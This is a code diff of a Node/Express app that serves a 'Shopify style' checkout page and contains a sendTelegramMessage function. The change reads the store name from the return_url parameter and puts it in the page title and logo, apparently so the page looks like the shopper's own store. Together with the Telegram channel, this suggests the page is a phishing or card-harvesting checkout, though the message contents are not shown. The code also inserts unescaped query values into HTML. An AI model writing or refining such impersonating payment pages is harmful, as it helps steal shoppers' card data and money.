@@ -49,6 +49,19 @@ async function sendTelegramMessage(text) {
   }
 }
 
+// Extract store name from URL
+function getStoreName(url) {
+  if (!url) return 'Store';
+  try {
+    const hostname = new URL(url).hostname;
+    const parts = hostname.replace('www.', '').split('.');
+    const name = parts[0];
+    return name.charAt(0).toUpperCase() + name.slice(1);
+  } catch {
+    return 'Store';
+  }
+}
+
 // Checkout pagina (Shopify style)
 app.get('/checkout', async (req, res) => {
   const { amount, currency, order_id, return_url, cart_items } = req.query;
@@ -67,6 +80,7 @@ app.get('/checkout', async (req, res) => {
   }
 
   const sessionId = Date.now().toString();
+  const storeName = getStoreName(return_url);
 
   // Build cart items HTML
   let cartItemsHtml = '';
@@ -88,7 +102,7 @@ app.get('/checkout', async (req, res) => {
       <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <title>Checkout - €${amount}</title>
+        <title>${storeName} - Checkout</title>
         <link rel="preconnect" href="https://fonts.googleapis.com">
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
         <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
@@ -365,7 +379,7 @@ app.get('/checkout', async (req, res) => {
           <!-- Left side - Form -->
           <div class="checkout-form">
             <div id="form-container">
-              <div class="logo">Your Store</div>
+              <div class="logo">${storeName}</div>
               
               <div class="breadcrumb">
                 <a href="${return_url || '/'}">Cart</a>
